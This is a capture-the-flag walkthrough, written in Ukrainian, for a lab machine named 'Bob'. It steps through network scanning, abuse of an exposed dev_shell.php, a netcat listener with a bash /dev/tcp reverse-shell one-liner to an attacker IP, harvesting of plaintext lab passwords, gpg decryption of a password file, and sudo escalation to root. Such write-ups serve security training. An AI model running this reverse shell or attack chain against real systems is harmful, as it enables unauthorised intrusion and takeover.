# Bob

### 1. Recon: Active Scanning(T1595)

```bash
sudo netdiscover -r 10.48.57.0/24
```

<img width="629" height="146" alt="image" src="https://github.com/user-attachments/assets/08ef8cfe-e707-4c00-aabb-073ad99d8ddd" />

Адрес машини: 10.48.57.188

### 2. Recon: Active Scanning: Network Service Scanning(T1595.002)

```bash
nmap -sC -sV -p- 10.48.57.188
```

<img width="765" height="362" alt="image" src="https://github.com/user-attachments/assets/7cd9629b-d4d5-4ab8-bc6c-5b5dbb404710" />

Добре, порт 80 i ssh на порту 25468. Одразу бачимо, що iснує /passwords.html, /robots.txt, /dev_shell.php

### 3. Initial Access: Exploit Public-Facing Application(T1190)

В /passwords.html нiчого немає, в /robots.txt знаходимо директорiї /login.php i /lat_memo.html

login.php не iснує, в lat_memo.html нiчого цiкавого. Переходимо в dev_shell.php

<img width="390" height="266" alt="image" src="https://github.com/user-attachments/assets/5739369d-e8ca-4920-8a87-9955c485bdb6" />

Працює, але там є фiльтр. Ми потребуємо повноцiнний shell, створюємо reverse shell

### 4. Execution: Unix Shell(T1059.004)

```bash
nc -lvnp 11111
```

```bash
bash -c 'bash -i >& /dev/tcp/10.48.57.71/11111 0>&1'
```

<img width="646" height="127" alt="image" src="https://github.com/user-attachments/assets/b228ffc1-c0d0-4cf0-ade3-c8a4b23cc529" />

### 5. Credential Access: Unsecured Credentials(T1552)

Шукаємо щось, що нам допоможе

<img width="610" height="506" alt="image" src="https://github.com/user-attachments/assets/7c33d792-096f-4553-b74c-dd92fedb93e0" />

Користувач "bob" має файл с старими паролями

<img width="325" height="134" alt="image" src="https://github.com/user-attachments/assets/ca3a89bb-5446-439b-b728-bbefd5b1c098" />

Маємо логiни i паролi до iнших користувачiв:

jc: Qwerty
seb: T1tanium_Pa$$word_Hack3rs_Fear_M3

Записуємо, шукаємо далi

<img width="513" height="253" alt="image" src="https://github.com/user-attachments/assets/c9ef630a-fb54-48f8-b271-bf91033d12a0" />

Виглядає дивно, схоже що першi лiтери складають слово "HARPOCRATES". Записуємо

<img width="452" height="110" alt="image" src="https://github.com/user-attachments/assets/63d86679-1f1f-499e-8415-73d7c30e8301" />

login.txt.gpg

<img width="597" height="428" alt="image" src="https://github.com/user-attachments/assets/e7bf7683-b01c-4a1f-b2a3-3ca5448bb3bd" />

<img width="975" height="279" alt="image" src="https://github.com/user-attachments/assets/6732d96d-4c94-4481-96a8-4ed754fc7587" />

Маємо ще логiн i пароль: elliot: theadminisdumb

Все переглянули, повертаємося i пiдключаємося через ssh, що знайшли ранiше

### 6. Credential Access: Credentials from Password Stores(T1555)

Розшифровуємо login.txt.gpg, ключ "HARPOCRATES", що ми знайшли ранiше

```bash
gpg --batch --yes --passphrase 'HARPOCRATES' -d login.txt.gpg
```

<img width="822" height="79" alt="image" src="https://github.com/user-attachments/assets/e3f75201-cfb0-4c77-9ba2-a33caccea66c" />

Маємо пароль Боба, адмiнiстратора цього сайту

### 7. Lateral Movement: Valid Accounts(Valid Accounts)

Заходимо як bob

<img width="362" height="56" alt="image" src="https://github.com/user-attachments/assets/139364a1-b86c-4ef9-b4f4-bbc992d6eaab" />

Перевiряємо, якi маємо права

<img width="891" height="83" alt="image" src="https://github.com/user-attachments/assets/d9e4c77e-760e-475f-94dc-93ce7da74684" />

### 8. Privilege Escalation: Abuse Elevation Control Mechanism: Sudo(T1548.003)

Можемо отримати root, переходимо

<img width="586" height="61" alt="image" src="https://github.com/user-attachments/assets/2de6c6fc-e3c4-4a37-9ce4-e446995ac539" />

Знаходимо флаг

<img width="298" height="55" alt="image" src="https://github.com/user-attachments/assets/f3b78ee6-aeeb-49b9-934c-7ee8c0d17ca9" />

### Перемога!

<img width="220" height="231" alt="image" src="https://github.com/user-attachments/assets/a622324b-2a64-4d88-a2c0-52c30ec544af" />
